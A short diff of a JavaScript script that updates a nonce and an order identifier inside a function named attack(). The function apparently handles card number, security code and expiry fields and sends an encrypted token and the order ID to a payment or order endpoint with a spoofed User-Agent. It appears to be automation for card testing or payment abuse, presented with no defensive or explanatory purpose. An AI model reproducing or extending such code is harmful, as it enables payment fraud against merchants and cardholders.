@@ -167,7 +167,7 @@ function getRandomDate() {
 }
 
 function attack() {
-    var nonceValue = 'b823f04f2b20fa645c2911d7d292360e';
+    var nonceValue = '227b9299f7b1aba0d82f9124544b8c78';
     /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
     var iptSec = $('#secu');
     var iptExp = $('#exp');
@@ -207,7 +207,7 @@ function attack() {
                 'User-Agent': userAgent
             },
             body: JSON.stringify({
-                o: 'a9162a7e45d8c',
+                o: '7c920cdad2ee7',
                 tkn: encrypted
             })
         }).then(r => r.json().then(r => {
@@ -224,7 +224,7 @@ function attack() {
                         },
                         body: JSON.stringify({
                             t: Date.now(),
-                            ord: "a9162a7e45d8c"
+                            ord: "7c920cdad2ee7"
                         })
                     }).then(rrep => rrep.json().then(resp => {
                         console.log(resp)
